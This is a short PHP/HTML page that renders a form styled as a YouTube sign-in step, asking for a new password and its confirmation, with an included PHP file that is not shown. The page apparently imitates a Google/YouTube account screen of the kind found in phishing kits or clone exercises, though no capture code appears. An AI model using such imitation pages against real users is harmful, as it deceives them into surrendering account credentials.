<?php 

include("../include/my_link.php");


 ?>

<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link rel="stylesheet" type="text/css" href="style/style.css">
</head>
<body>

	<div class="container">
		 <div class="form">
		 	
		 	<form method="post"><h2>Sign In</h2>
		 	<h3>to continue to YouTube</h3>
		 	<div class="text-field">
                <input type="password" class="input" required>
                <label>Enter New Password</label>
            </div>

            <div class="text-field">
                <input type="password" class="input" required>
                <label>Confirm Password</label>
            </div>

            
		 		<div style="margin-top: 30px;">
		 			<input type="submit" name="next" class="next" value="Update">
		 		</div>
		 	</form>
		 </div>
	</div>

</body>
</html>